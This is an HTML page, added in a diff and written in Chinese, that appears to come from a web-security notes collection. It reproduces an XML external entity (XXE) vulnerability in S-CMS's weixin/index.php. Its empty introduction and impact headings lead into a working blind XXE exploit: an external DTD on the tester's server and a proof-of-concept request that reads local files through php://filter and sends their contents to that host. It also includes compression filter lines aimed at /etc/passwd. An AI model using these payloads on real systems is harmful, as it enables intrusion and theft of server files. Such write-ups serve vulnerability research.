@@ -1,0 +1,38 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="s-cms-xxe漏洞"><span class="csDE05BCC">S-CMS xxe</span><span class="csECDA2D3">漏洞</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<h3 class="cs868C439D">
+			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">全局搜索</span><span class="cs9FB05234">simplexml</span><span class="cs9C1B1871">，在</span><span class="cs9FB05234">weixin/index.php</span><span class="cs9C1B1871">发现漏洞</span></p><p class="cs40DD2BC9"><span><img src="Web安全/S-CMS/S-CMS%20xxe%e6%bc%8f%e6%b4%9e_files/image0.jpg" width="560" height="421" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">非常标准的</span><span class="cs8926E06">XXE</span><span class="cs9C1B1871">，没有任何过滤手段，往下并未发现有输出</span><span class="cs8926E06">XML</span><span class="cs9C1B1871">解析结果的地方，此处应用无回显的</span><span class="cs8926E06">XXE</span><span class="cs9C1B1871">攻击手段</span></p><h3 class="cs868C439D">
+			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">首先在自己的服务器（</span><span class="cs8926E06">192.168.64.131</span><span class="cs9C1B1871">）上创建一个供靶机外部引用的</span><span class="cs8926E06">dtd</span><span class="cs9C1B1871">文件（</span><span class="cs8926E06">test.dtd</span><span class="cs9C1B1871">）</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;!ENTITY % all </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://192.168.64.131/?%file;&#39;&gt;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">%all;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">发送</span><span class="cs8926E06">POC</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;!DOCTYPE ANY [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/phpStudy/PHPTutorial/WWW/robots.txt&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.64.131/test.dtd&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">%dtd;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">%send;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">]&gt;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/S-CMS/S-CMS%20xxe%e6%bc%8f%e6%b4%9e_files/image1.jpg" width="560" height="160" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后在</span><span class="cs8926E06">Apache</span><span class="cs9C1B1871">日志中查看到结果：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/S-CMS/S-CMS%20xxe%e6%bc%8f%e6%b4%9e_files/image2.jpg" width="560" height="114" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在这里发现一个问题，查看其它</span><span class="cs8926E06">php</span><span class="cs9C1B1871">文件的内容会发生</span><span class="cs9FB05234">Detected an entity reference loop</span><span class="cs9C1B1871">错误，查询资料发现</span><span class="cs8926E06">libxml</span><span class="cs9C1B1871">解析器默认限制外部实体长度为</span><span class="cs8926E06">2k</span><span class="cs9C1B1871">，无法突破，只能寻找压缩解决方案（但效果不明显）</span></p><p class="cs3A447A38"><span class="cs7FFD2630">压缩：</span><span class="cs9FB05234">echo file_get_contents(&quot;php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&quot;);</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">解压：</span><span class="cs9FB05234">echo file_get_contents(&quot;php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1&quot;);</span></p><h2 class="cs868C439D">
+			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
+		<p class="cs6FD73CFB"><span class="cs8926E06">http://pines404.online/2019/10/31/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/S-CMS%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/</span></p></body>
+</html>
